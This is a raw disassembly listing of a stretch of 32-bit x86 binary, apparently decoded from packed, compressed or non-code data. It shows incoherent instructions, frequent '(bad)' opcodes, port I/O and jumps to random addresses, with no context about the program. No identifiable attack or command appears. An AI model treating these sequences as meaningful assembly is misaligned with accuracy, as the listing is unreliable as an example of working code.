  41bd96:	cmp    dh,BYTE PTR [ebp-0x6bb7e566]
  41bd9c:	test   bh,0x2
  41bd9f:	jne    0x41bdc0
  41bda1:	jl     0x41bd4d
  41bda3:	push   0xb2916265
  41bda8:	out    dx,al
  41bda9:	mov    bh,0x8f
  41bdab:	icebp  
  41bdac:	push   ebx
  41bdad:	jge    0x41bdd2
  41bdaf:	pop    ebp
  41bdb0:	in     eax,0x3d
  41bdb2:	dec    ebp
  41bdb3:	rcl    al,1
  41bdb5:	dec    eax
  41bdb6:	inc    ecx
  41bdb7:	xor    ah,BYTE PTR [edx+0x46f68370]
  41bdbd:	mov    dh,0x4a
  41bdbf:	lods   eax,DWORD PTR ds:[esi]
  41bdc0:	bound  ebp,QWORD PTR [ecx-0x76]
  41bdc3:	test   al,0x53
  41bdc5:	daa    
  41bdc6:	dec    edx
  41bdc7:	lea    edx,[ecx+edx*4-0x68b763b5]
  41bdce:	std    
  41bdcf:	dec    ecx
  41bdd0:	pop    es
  41bdd1:	and    esp,DWORD PTR [ebx+0x54223c7c]
  41bdd7:	adc    dl,bh
  41bdd9:	test   eax,0x6d19d68a
  41bdde:	scas   al,BYTE PTR es:[edi]
  41bddf:	in     eax,0x8e
  41bde1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bde2:	jle    0x41be04
  41bde4:	sub    edi,DWORD PTR [edi]
  41bde6:	in     al,dx
  41bde7:	push   ebp
  41bde8:	xchg   esp,eax
  41bde9:	mov    DWORD PTR [ecx-0x62],0xeafb4a72
  41bdf0:	push   0xfffffff0
  41bdf2:	sbb    eax,DWORD PTR [edi+0x62]
  41bdf5:	fs mov esi,0x86cb51b8
  41bdfb:	or     al,0xfc
  41bdfd:	pop    eax
  41bdfe:	int    0x92
  41be00:	push   ss
  41be01:	push   esp
  41be02:	gs inc ebp
  41be04:	adc    BYTE PTR [ebx+0x5928fd6c],0x33
  41be0b:	ss sbb al,0x70
  41be0e:	mov    edx,0xe8394eb
  41be13:	xchg   esp,eax
  41be14:	mov    bl,0x4b
  41be16:	cli    
  41be17:	ins    BYTE PTR es:[edi],dx
  41be18:	mov    edx,0xdbda3349
  41be1d:	les    edx,FWORD PTR [ebx]
  41be1f:	jge    0x41be7a
  41be21:	jecxz  0x41be28
  41be23:	rcl    ebp,cl
  41be25:	pop    ebx
  41be26:	and    DWORD PTR [ebx],esi
  41be28:	and    DWORD PTR [eax-0x6a],ebx
  41be2b:	xor    BYTE PTR [edi],al
  41be2d:	add    esi,ebp
  41be2f:	mov    ds:0x4d9ba137,eax
  41be34:	imul   edi,ebx,0x41
  41be37:	sbb    eax,0x965bfc32
  41be3c:	mov    ebp,DWORD PTR [esi+0x4b42dc92]
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	wbinvd 
  41bec1:	inc    esp
  41bec2:	adc    eax,0x12d9e54
  41bec7:	add    dh,dh
  41bec9:	add    BYTE PTR [eax],al
  41becb:	add    BYTE PTR [edi+ecx*1+0x58fa12f9],cl
  41bed2:	dec    ecx
  41bed3:	xchg   edx,eax
  41bed4:	inc    esp
  41bed5:	cmp    eax,0xe00ae989
  41beda:	mov    esp,0x83760d97
  41bedf:	add    bh,BYTE PTR [ebp-0x1e]
  41bee2:	rcl    BYTE PTR [eax+0x69868bf5],1
  41bee8:	mov    ah,0x89
  41beea:	add    eax,0xb88f4e0a
  41beef:	lahf   
  41bef0:	jmp    0x41bf30
  41bef2:	jle    0x41bed7
  41bef4:	ror    DWORD PTR [eax],0x4c
  41bef7:	ret    0xc6e7
  41befa:	mov    bl,0x25
  41befc:	xchg   eax,edx
  41befe:	cmp    eax,0xb1b9dc3b
  41bf03:	jno    0x41bf2b
  41bf05:	mov    DWORD PTR [eax-0x6f626be6],edi
  41bf0b:	mov    DWORD PTR [edx],edx
  41bf0d:	arpl   WORD PTR [ebx],ax
  41bf0f:	dec    eax
  41bf10:	xor    esi,DWORD PTR [edi-0x56699f1c]
  41bf16:	push   edx
  41bf17:	jle    0x41bf6a
  41bf19:	lock ret 
  41bf1b:	mov    BYTE PTR [edx+0x49],dl
  41bf1e:	retf   0xf565
  41bf21:	inc    ebx
  41bf22:	adc    BYTE PTR [ecx-0x1a],ah
  41bf25:	push   ebp
  41bf26:	or     DWORD PTR [ebx-0x58],ecx
  41bf29:	fmul   st(5),st
  41bf2b:	sbb    edi,DWORD PTR [ecx]
  41bf2d:	cs xchg esp,eax
  41bf2f:	fiadd  DWORD PTR [edx+0x4fecc11f]
  41bf35:	adc    ah,BYTE PTR [edi+0x4d]
  41bf38:	xchg   esp,eax
  41bf39:	jbe    0x41bf88
  41bf3b:	jg     0x41bf32
  41bf3d:	es push 0xde52e305
  41bf43:	adc    DWORD PTR ds:0x8e51592c,ebx
  41bf49:	sti    
  41bf4a:	gs icebp 
  41bf4c:	fbstp  TBYTE PTR [eax-0xb65f191]
  41bf52:	xor    eax,0xa8f6bea0
  41bf57:	int    0xe2
  41bf59:	arpl   WORD PTR [edi],bx
  41bf5b:	aad    0x49
  41bf5d:	mov    esi,0x21589bfe
  41bf62:	sti    
  41bf63:	(bad)  
  41bf64:	shl    DWORD PTR [edi-0x16232b32],cl
  41bf6a:	jl     0x41bfaa
  41bf6c:	jp     0x41bf5f
  41bf6e:	sar    DWORD PTR [ecx-0x19dd2da7],1
  41bf74:	je     0x41bfb6
  41bf76:	mov    WORD PTR [ebp-0x37a65a8b],gs
  41bf7c:	mov    esi,0x37edb5ad
  41bf81:	sbb    esi,DWORD PTR [eax+0x15530977]
  41bf87:	push   ds
  41bf88:	dec    esp
  41bf89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf8a:	lock mov dh,0x2b
  41bf8d:	xchg   BYTE PTR [edx+0x6bcc9da6],cl
  41bf93:	push   0xb1c81105
  41bf98:	std    
  41bf99:	and    ebp,DWORD PTR fs:[eax+0x5c]
  41bf9d:	leave  
  41bf9e:	dec    esi
  41bf9f:	inc    ecx
  41bfa0:	sbb    al,0x3d
  41bfa2:	ficom  WORD PTR [edx+0x68]
  41bfa5:	push   ss
  41bfa6:	pop    eax
  41bfa7:	pause  
  41bfa9:	sub    eax,0xf7024c00
  41bfae:	dec    ebx
  41bfaf:	pop    es
  41bfb0:	pop    edi
  41bfb1:	mov    edi,0x8c56dc45
  41bfb6:	pop    es
  41bfb7:	inc    eax
  41bfb8:	ret    0x70aa
  41bfbb:	mov    al,ds:0x9d92e730
  41bfc0:	inc    esi
  41bfc1:	or     al,BYTE PTR [eax]
	...
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x5b44657f]
  41c041:	inc    ebx
  41c042:	or     ch,BYTE PTR [ebp-0x6c]
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	test   BYTE PTR [eax],0x0
  41c04b:	add    BYTE PTR [ebx],ah
  41c04d:	das    
  41c04e:	mov    ebp,0xe3414cee
  41c053:	leave  
  41c054:	cli    
  41c055:	cmp    edx,DWORD PTR [eax+0x68]
  41c058:	and    edi,esi
  41c05a:	enter  0x6bd,0x3
  41c05e:	lds    ecx,FWORD PTR [ecx+0x4d]
  41c061:	push   ecx
  41c062:	popa   
  41c063:	pushf  
  41c064:	sbb    DWORD PTR [ebp+edx*8+0x386f1c42],ebx
  41c06b:	aas    
  41c06c:	ins    DWORD PTR es:[edi],dx
  41c06d:	mov    eax,ds:0x689a4497
  41c072:	xor    bl,dh
  41c074:	neg    DWORD PTR [esi+edx*8]
  41c077:	xchg   esp,eax
  41c078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c079:	jo     0x41c0aa
  41c07b:	bound  ecx,QWORD PTR [eax-0x64ac31a6]
  41c081:	xchg   ecx,eax
  41c082:	dec    esp
  41c083:	lods   eax,DWORD PTR ds:[esi]
  41c084:	pop    ebp
  41c085:	mov    BYTE PTR [edx-0x3a6d6957],0xb6
  41c08c:	lods   al,BYTE PTR ds:[esi]
  41c08d:	loope  0x41c0cf
  41c08f:	cdq    
  41c090:	pop    ds
  41c091:	das    
  41c092:	add    ecx,DWORD PTR [eax+0x77]
  41c095:	test   al,0xff
  41c097:	inc    ebx
  41c098:	leave  
  41c099:	(bad)  
  41c09b:	gs stos DWORD PTR es:[edi],eax
  41c09d:	jecxz  0x41c0ae
  41c09f:	jmp    esi
  41c0a1:	aam    0x47
  41c0a3:	and    BYTE PTR [ecx+0x278d891f],dl
  41c0a9:	lock aam 0xf2
  41c0ac:	sub    DWORD PTR [edx+0xee0aa97],0x8c0689e0
  41c0b6:	lds    ebp,FWORD PTR [ecx+0x293e43f3]
  41c0bc:	adc    eax,0xafb36789
  41c0c1:	mov    DWORD PTR gs:[eax+0x33],eax
  41c0c5:	aad    0xf0
  41c0c7:	xchg   esi,eax
  41c0c8:	xor    bh,BYTE PTR ds:0x86ed8c34
  41c0ce:	cs dec esi
  41c0d0:	test   al,0xf7
  41c0d2:	adc    al,0x9e
  41c0d4:	adc    esp,DWORD PTR [ebp-0x76]
  41c0d7:	es loopne 0x41c078
  41c0da:	mov    cl,0xbf
  41c0dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0dd:	sub    esi,DWORD PTR [eax]
  41c0df:	jp     0x41c06e
  41c0e1:	pop    edi
  41c0e2:	(bad)  
  41c0e3:	xchg   esi,eax
  41c0e4:	and    eax,DWORD PTR [ecx-0x3a]
  41c0e7:	and    bl,BYTE PTR [ecx+ebx*2+0x3ef65699]
  41c0ee:	sahf   
  41c0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f0:	sbb    al,0xb6
  41c0f2:	mov    ch,0x1d
  41c0f4:	and    bl,BYTE PTR [ebx+0x3d8af8b]
  41c0fa:	shl    DWORD PTR [esi],0x61
  41c0fd:	test   DWORD PTR [edi],esi
  41c0ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c100:	les    ebp,FWORD PTR [eax]
  41c102:	pop    ecx
  41c103:	das    
  41c104:	or     eax,0x1a37e24c
  41c109:	test   DWORD PTR [edi+0x5c],eax
  41c10c:	ss mov bh,0x29
  41c10f:	sub    al,0x23
  41c111:	or     al,BYTE PTR [ebx-0x3c]
  41c114:	cmp    dl,BYTE PTR [edx]
  41c116:	xchg   ah,dh
  41c118:	jmp    0x574c0da2
  41c11d:	je     0x41c150
  41c11f:	shl    BYTE PTR [edi],cl
  41c121:	and    eax,0xacc5e282
  41c126:	mov    edx,DWORD PTR [esi-0x27d2840a]
  41c12c:	jl     0x41c12c
  41c12e:	jmp    0x41c1a8
  41c130:	fs out 0x12,al
  41c133:	ret    0x526a
  41c136:	inc    ebp
  41c137:	data16 and BYTE PTR [edi-0x7c],bh
  41c13b:	vorps  xmm0,xmm3,XMMWORD PTR [edi-0x6a]
  41c140:	mov    edx,edi
	...
  41c1b2:	add    BYTE PTR [eax],al
  41c1b4:	mov    fs,WORD PTR [ebp-0x13941f97]
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x3d0530c8
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    ch,al
  41c1cd:	(bad)
  41c1d1:	inc    eax
  41c1d2:	jo     0x41c1c1
  41c1d4:	retf   0x629b
  41c1d7:	inc    eax
  41c1d8:	xlat   BYTE PTR ds:[ebx]
  41c1d9:	sbb    eax,esp
  41c1db:	xchg   DWORD PTR ds:0xc1df5ee8,edi
  41c1e1:	xchg   esp,eax
  41c1e2:	pop    ebp
  41c1e3:	add    eax,DWORD PTR [edi+0x24]
  41c1e6:	inc    eax
  41c1e7:	jmp    0x4854b7d1
  41c1ec:	(bad)  
  41c1ed:	sbb    dh,cl
  41c1ef:	xor    esp,edi
  41c1f1:	repz cmp DWORD PTR [ebp-0x4e],eax
  41c1f5:	and    eax,0x46eff73
  41c1fa:	and    BYTE PTR [edx+0x41],al
  41c1fd:	adc    bh,BYTE PTR [edi-0x19654f1]
  41c203:	ins    BYTE PTR es:[edi],dx
  41c204:	cmp    al,0x21
  41c206:	cmp    cl,bh
  41c208:	out    dx,al
  41c209:	or     eax,0xed221968
  41c20e:	or     BYTE PTR [edi+edx*8],0x64
  41c212:	or     al,bl
  41c214:	xlat   BYTE PTR ds:[ebx]
  41c215:	mov    DWORD PTR [eax],ebx
  41c217:	adc    dh,ch
  41c219:	nop
  41c21a:	push   0xc61b2a76
  41c21f:	or     al,0x9f
  41c221:	dec    ecx
  41c222:	mov    bh,0xc0
  41c224:	ins    BYTE PTR es:[edi],dx
  41c225:	out    0x72,ax
  41c228:	inc    esp
  41c229:	push   ebp
  41c22a:	lods   al,BYTE PTR fs:[esi]
  41c22c:	cli    
  41c22d:	ficom  DWORD PTR [edx+0x33b905d5]
  41c233:	push   edx
  41c234:	enter  0xf1ed,0x57
  41c238:	rcr    ecx,1
  41c23a:	add    eax,0xb5ab70a7
  41c23f:	adc    BYTE PTR [ebx-0x2d],bh
  41c242:	iret   
  41c243:	push   ebp
  41c244:	sar    al,0x64
  41c247:	dec    esp
  41c248:	cli    
  41c249:	push   ebx
  41c24a:	leave  
  41c24b:	xchg   esi,eax
  41c24c:	add    DWORD PTR [esi-0x70bf12ca],edi
  41c252:	adc    BYTE PTR [eax+edx*1+0x4cd6cbab],bh
  41c259:	push   ds
  41c25a:	test   al,0xb6
  41c25c:	sahf   
  41c25d:	dec    ecx
  41c25e:	push   es
  41c25f:	mov    edi,0x7d4dbc40
  41c264:	or     eax,0x2cc74f6d
  41c269:	icebp  
  41c26a:	push   ebp
  41c26b:	sub    bl,ah
  41c26d:	(bad)  
  41c26e:	ret    0x5485
  41c271:	xchg   ebx,eax
  41c272:	(bad)  
  41c273:	loopne 0x41c1fc
  41c275:	stos   DWORD PTR es:[edi],eax
  41c276:	inc    edx
  41c277:	dec    eax
  41c278:	mov    ah,0x55
  41c27a:	add    al,0xb3
  41c27c:	in     eax,0xf6
  41c27e:	jmp    0x41c2ce
  41c280:	xlat   BYTE PTR ds:[ebx]
  41c281:	and    al,0x2a
  41c283:	mov    BYTE PTR [edx-0x65],0x2f
  41c287:	test   al,0xd9
  41c289:	adc    al,0xa1
  41c28b:	ins    BYTE PTR es:[edi],dx
  41c28c:	pop    ebx
  41c28d:	pop    edx
  41c28e:	loopne 0x41c26e
  41c290:	cli    
  41c291:	inc    esp
  41c292:	push   ss
  41c293:	sub    eax,0x7e850b8e
  41c298:	pusha  
  41c299:	and    al,0x37
  41c29b:	jle    0x41c299
  41c29d:	jg     0x41c281
  41c29f:	or     ch,BYTE PTR [edi]
  41c2a1:	sbb    eax,0xb1599899
  41c2a6:	jg     0x41c2ed
  41c2a8:	out    dx,al
  41c2a9:	fucomp st(5)
  41c2ab:	sub    al,0x76
  41c2ad:	jno    0x41c288
  41c2af:	push   ebp
  41c2b0:	xchg   BYTE PTR [ebp+0x66ac7cdc],cl
  41c2b6:	mov    ebx,0xa4f1ca07
  41c2bb:	mov    ds:0xffcb66e2,al
  41c2c0:	das    
  41c2c1:	inc    eax
	...
  41c332:	add    BYTE PTR [eax],al
  41c334:	dec    eax
  41c335:	or     eax,0xbb5dab1d
  41c33a:	(bad)  
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	xchg   edx,eax
  41c341:	fsubr  QWORD PTR [ebx-0x54]
  41c344:	xor    BYTE PTR [eax],0x1
  41c347:	add    dh,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [eax-0x28c97202],dh
  41c351:	lods   al,BYTE PTR ds:[esi]
  41c352:	iret   
  41c353:	test   eax,0x8cedafc6
  41c358:	and    ebx,DWORD PTR [eax+0x26]
  41c35b:	mov    DWORD PTR [ecx],ebp
  41c35d:	mov    ecx,0x19d43fc3
  41c362:	cli    
  41c363:	cmp    BYTE PTR [esi],cl
  41c365:	fcomp  QWORD PTR [ebx]
  41c367:	jns    0x41c354
  41c369:	xchg   ecx,eax
  41c36a:	sbb    dl,ch
  41c36c:	dec    edx
  41c36d:	mov    eax,ds:0x3616d406
  41c372:	inc    ecx
  41c373:	dec    esi
  41c374:	adc    DWORD PTR [edi],esp
  41c376:	ja     0x41c3d0
  41c378:	fcmovu st,st(1)
  41c37a:	pcmpgtd mm6,QWORD PTR [edi-0x45]
  41c37e:	loop   0x41c3cf
  41c380:	std    
  41c381:	jp     0x41c369
  41c383:	add    BYTE PTR [esp+ebx*4+0x3fe9f7f0],0x10
  41c38b:	dec    eax
  41c38c:	aas    
  41c38d:	pop    eax
  41c38e:	retf   
  41c38f:	bnd jae 0x41c330
  41c392:	push   ds
  41c393:	imul   edx,DWORD PTR [esi+0x2e],0xd4f8c29d
  41c39a:	imul   ebx,DWORD PTR [edx+eiz*8],0x14
  41c39e:	cmp    DWORD PTR [eax+0x54995b20],eax
  41c3a4:	out    0xe8,eax
  41c3a6:	pusha  
  41c3a7:	pop    ebx
  41c3a8:	addr16 pop edx
  41c3aa:	pop    es
  41c3ab:	xchg   edx,eax
  41c3ac:	add    bl,cl
  41c3ae:	fidivr DWORD PTR [edx-0x4d5219b]
  41c3b4:	add    DWORD PTR [esi-0x13],esi
  41c3b7:	and    eax,0x9cea16cb
  41c3bc:	test   BYTE PTR [edi+0x257404e7],dl
  41c3c2:	mov    al,0x45
  41c3c4:	stos   BYTE PTR es:[edi],al
  41c3c5:	repnz out dx,eax
  41c3c7:	xor    BYTE PTR [esi],ah
  41c3c9:	outs   dx,BYTE PTR ds:[esi]
  41c3ca:	(bad)  
  41c3cb:	sub    eax,eax
  41c3cd:	inc    esi
  41c3ce:	aaa    
  41c3cf:	dec    ebx
  41c3d0:	(bad)  
  41c3d1:	outs   dx,BYTE PTR ds:[esi]
  41c3d2:	pushf  
  41c3d3:	inc    ebp
  41c3d4:	lods   al,BYTE PTR ds:[esi]
  41c3d5:	dec    edx
  41c3d6:	mov    ebx,0x5397674a
  41c3db:	jg     0x41c449
  41c3dd:	dec    esi
  41c3de:	inc    ebx
  41c3df:	sub    al,ah
  41c3e1:	add    eax,0xb392d4b3
  41c3e6:	or     dl,BYTE PTR [ecx+0x50]
  41c3e9:	xchg   edx,eax
  41c3ea:	cmp    al,0xa8
  41c3ec:	xor    eax,DWORD PTR ds:0xf425e8a3
  41c3f2:	sti    
  41c3f3:	hlt    
  41c3f4:	sub    BYTE PTR [ecx+0xa],al
  41c3f7:	fs mov edi,0x29aef47a
  41c3fd:	sbb    esi,esi
  41c3ff:	or     eax,0xb715be07
  41c404:	or     DWORD PTR [ebx+0x46],ebx
  41c407:	xchg   ebp,eax
  41c408:	xor    DWORD PTR [ecx+ebp*1+0x4de47509],0x795a447c
  41c413:	jmp    0x6afda478
  41c418:	jmp    0xa6d1:0xe6157201
  41c41f:	fdiv   st(6),st
  41c421:	rcr    esp,cl
  41c423:	cmp    DWORD PTR [esi],edi
  41c425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c426:	mov    ecx,0xde2fbef8
  41c42b:	mov    al,0x8e
  41c42d:	sar    esp,1
  41c42f:	mov    dh,0x8e
  41c431:	pop    eax
  41c432:	ss push esi
  41c434:	(bad)  
  41c435:	adc    eax,DWORD PTR [eax+ebx*2]
  41c438:	mov    cl,0xcf
  41c43a:	lods   eax,DWORD PTR ds:[esi]
  41c43b:	mov    BYTE PTR [edx],ah
  41c43d:	clc    
  41c43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43f:	scas   eax,DWORD PTR es:[edi]
  41c440:	pop    ecx
  41c441:	xor    al,0x0
	...
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x1ec08a8b]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    dh,al
  41c4cd:	cmp    BYTE PTR [ecx+edx*8-0x38],bl
  41c4d1:	es jmp 0x6c083e29
  41c4d7:	lock push cs
  41c4d9:	int3   
  41c4da:	xchg   ebx,eax
  41c4db:	dec    edx
  41c4dc:	arpl   WORD PTR [ecx+0x12172855],bp
  41c4e2:	push   0xd44b0e19
  41c4e7:	or     dl,ah
  41c4e9:	call   0xffe00aa3
  41c4ee:	(bad)  
  41c4ef:	mov    dl,0x58
  41c4f1:	lock xor BYTE PTR [esi+0x67b14dac],dh
  41c4f8:	shr    BYTE PTR [ebx],cl
  41c4fa:	mov    dh,0x4f
  41c4fc:	std    
  41c4fd:	sub    esi,DWORD PTR [ecx]
  41c4ff:	cs loope 0x41c498
  41c502:	xchg   edi,eax
  41c503:	fwait
  41c504:	xchg   ebx,eax
  41c505:	in     al,dx
  41c506:	in     eax,0xed
  41c508:	push   eax
  41c509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c50a:	dec    esi
  41c50b:	mov    ecx,0x69f9570
  41c510:	pop    ebp
  41c511:	push   edi
  41c512:	lock retf 0x3f91
  41c516:	dec    ecx
  41c517:	cld    
  41c518:	(bad)  
  41c519:	scas   al,BYTE PTR es:[edi]
  41c51a:	loopne 0x41c558
  41c51c:	cwde   
  41c51d:	mov    ds:0x137fbfce,al
  41c522:	cmp    al,bh
  41c524:	in     al,dx
  41c525:	jecxz  0x41c4ea
  41c527:	loop   0x41c5a6
  41c529:	rcr    DWORD PTR [ebx+0x76c0f88],cl
  41c52f:	es add eax,0xd687e8a3
  41c535:	fst    QWORD PTR [esi]
  41c537:	inc    edx
  41c538:	push   ss
  41c539:	paddsw mm3,QWORD PTR [ebx+eax*1+0x7]
  41c53e:	and    BYTE PTR [edx+esi*4+0x22017cf6],ch
  41c545:	sbb    al,0xc8
  41c547:	out    0x8,eax
  41c549:	repnz xor bl,bh
  41c54c:	int3   
  41c54d:	adc    ecx,DWORD PTR [edi*1+0x2bbe9350]
  41c554:	ja     0x41c5cc
  41c556:	sbb    al,0x36
  41c558:	ins    DWORD PTR es:[edi],dx
  41c559:	xchg   edx,eax
  41c55a:	add    al,0x4
  41c55c:	in     al,0x3a
  41c55e:	mov    bh,0xae
  41c560:	push   0x40cc1232
  41c565:	mov    al,ds:0x760420c
  41c56a:	lock inc ebp
  41c56c:	out    dx,eax
  41c56d:	sbb    ebx,DWORD PTR [ebp-0x2427eb9c]
  41c573:	xchg   edi,eax
  41c574:	xor    dl,BYTE PTR [edi]
  41c576:	sub    eax,0x310bfce7
  41c57b:	and    BYTE PTR [ebp-0x53],dh
  41c57e:	test   DWORD PTR [edi],0xf78012aa
  41c584:	mov    edi,0x293160c9
  41c589:	icebp  
  41c58a:	pmaxub mm6,QWORD PTR ds:0x25da63ce
  41c591:	popa   
  41c592:	mov    ebx,0x5b35f947
  41c597:	and    ah,0xd5
  41c59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c59b:	repnz cmp ecx,esp
  41c59e:	dec    ecx
  41c59f:	mov    WORD PTR [ebp-0x2],ss
  41c5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a3:	xchg   esp,eax
  41c5a4:	mov    al,ds:0x895be77d
  41c5a9:	push   ebx
  41c5aa:	outs   dx,BYTE PTR ds:[esi]
  41c5ab:	fcom   st(7)
  41c5ad:	loop   0x41c555
  41c5af:	push   edx
  41c5b0:	xor    esp,edx
  41c5b2:	xor    al,0x1f
  41c5b4:	cmp    ah,BYTE PTR ss:[esi+esi*1]
  41c5b8:	ins    BYTE PTR es:[edi],dx
  41c5b9:	retf   0x21c5
  41c5bc:	fstp   st(7)
  41c5be:	mov    edi,0x940378
	...
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	mov    WORD PTR [ecx-0x1c],?
  41c643:	jno    0x41c6b1
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    dh,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [ecx],ah
  41c64d:	stos   BYTE PTR es:[edi],al
  41c64e:	sub    eax,0xd37cd0b2
  41c653:	mov    fs,esp
  41c655:	mov    dl,0xe4
  41c657:	hlt    
  41c658:	adc    al,0x66
  41c65a:	push   cs
  41c65b:	jns    0x41c6ba
  41c65d:	or     eax,0x669dedf6
  41c662:	add    eax,0x3ba83084
  41c667:	xchg   ebp,eax
  41c668:	pop    ebp
  41c669:	loop   0x41c6d0
  41c66b:	sub    eax,0x3c429641
  41c670:	add    DWORD PTR ds:0xf2f8826d,edx
  41c676:	call   0xc683:0xbb16c2e1
  41c67d:	sbb    BYTE PTR ds:0x81b8838b,bl
  41c683:	mov    al,ds:0x78a84750
  41c688:	test   BYTE PTR [eax],cl
  41c68a:	pop    esi
  41c68b:	mov    DWORD PTR [ecx-0x735e1c9b],edi
  41c691:	mov    ch,0x5d
  41c693:	xchg   ebp,eax
  41c695:	xchg   esp,eax
  41c696:	je     0x41c6a3
  41c698:	push   ebx
  41c699:	das    
  41c69a:	retf   
  41c69b:	mov    ecx,0xedff695c
  41c6a0:	ret    
  41c6a1:	dec    edi
  41c6a2:	and    al,0xb2
  41c6a4:	adc    BYTE PTR [ebx],ah
  41c6a6:	jg     0x41c702
  41c6a8:	cmp    dh,BYTE PTR [eax+ebx*1]
  41c6ab:	aad    0x29
  41c6ad:	pusha  
  41c6ae:	mov    eax,0x994a3578
  41c6b3:	mov    eax,ds:0xce163fe0
  41c6b8:	test   BYTE PTR [edi+0x54],bl
  41c6bb:	aad    0xc3
  41c6bd:	mov    dh,0x79
  41c6bf:	pop    es
  41c6c0:	call   0xbec08875
  41c6c5:	push   ecx
  41c6c6:	in     eax,dx
  41c6c7:	adc    edi,DWORD PTR [edi]
  41c6c9:	sub    BYTE PTR [ecx+0x5a],cl
  41c6cc:	retf   0x297e
  41c6cf:	mfence 
  41c6d2:	dec    ecx
  41c6d3:	jge    0x41c66f
  41c6d5:	add    DWORD PTR [eax-0x18],esp
  41c6d8:	xor    edi,DWORD PTR [eax+0x5a]
  41c6db:	add    eax,0xd37f9934
  41c6e0:	sub    eax,0xed42ee0b
  41c6e5:	push   0x7c0574f1
  41c6ea:	sub    ecx,DWORD PTR [esi]
  41c6ec:	jns    0x41c6b4
  41c6ee:	jbe    0x41c6fe
  41c6f0:	sub    edi,eax
  41c6f2:	imul   esp,DWORD PTR [ebp+0x7e],0x52
  41c6f6:	arpl   dx,sp
  41c6f8:	sub    BYTE PTR [ebp+esi*1+0x4892777d],bl
  41c6ff:	fwait
  41c700:	out    dx,eax
  41c701:	nop
  41c702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c703:	sub    ebx,0x79
  41c706:	pop    ebx
  41c707:	push   esp
  41c708:	add    DWORD PTR [ebx],0xffffffdc
  41c70b:	out    0xd5,eax
  41c70d:	and    al,0xe
  41c70f:	push   0xffffffb9
  41c711:	stc    
  41c712:	push   cs
  41c713:	sbb    edi,DWORD PTR [esi+esi*2+0x1e575e88]
  41c71a:	cld    
  41c71b:	and    al,0xfa
  41c71d:	aad    0x8d
  41c71f:	and    ch,ch
  41c721:	into   
  41c722:	dec    eax
  41c723:	inc    esp
  41c724:	inc    eax
  41c725:	int    0x70
  41c727:	jge    0x41c6df
  41c729:	jmp    0x41c701
  41c72b:	shl    al,0xb0
  41c72e:	sub    bh,BYTE PTR [edx-0x21]
  41c731:	xchg   edx,eax
  41c732:	xor    ah,bh
  41c734:	xchg   ebx,eax
  41c735:	fnstcw WORD PTR [ecx-0x78204935]
  41c73b:	neg    BYTE PTR [ebp+0x69109f2f]
  41c741:	sti    
	...
  41c7b2:	add    BYTE PTR [eax],al
  41c7b4:	mov    bh,ah
  41c7b6:	(bad)  
  41c7b7:	dec    esi
  41c7b8:	idiv   DWORD PTR [edi-0x75]
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0xcdbc4054
  41c7c3:	loop   0x41c827
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    dh,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [ecx],dh
  41c7cd:	outs   dx,BYTE PTR ds:[esi]
  41c7ce:	jnp    0x41c7e1
  41c7d0:	pop    eax
  41c7d1:	or     bl,bh
  41c7d3:	addr16 mov esi,0x2435209c
  41c7d9:	pop    eax
  41c7da:	retf   
  41c7db:	cdq    
  41c7dc:	shl    DWORD PTR [ebx-0xd],1
  41c7df:	pop    ebx
  41c7e0:	sti    
  41c7e1:	dec    esp
  41c7e2:	mov    dl,0x0
  41c7e4:	mov    dh,0xc2
  41c7e6:	push   edx
  41c7e7:	and    bh,cl
  41c7e9:	inc    eax
  41c7ea:	mov    al,ds:0xcadd2a06
  41c7ef:	inc    esi
  41c7f0:	push   0x38
  41c7f2:	cdq    
  41c7f3:	mov    esp,0xe7728142
  41c7f8:	push   esp
  41c7f9:	cwde   
  41c7fa:	lahf   
  41c7fb:	xlat   BYTE PTR ds:[ebx]
  41c7fc:	jb     0x41c77f
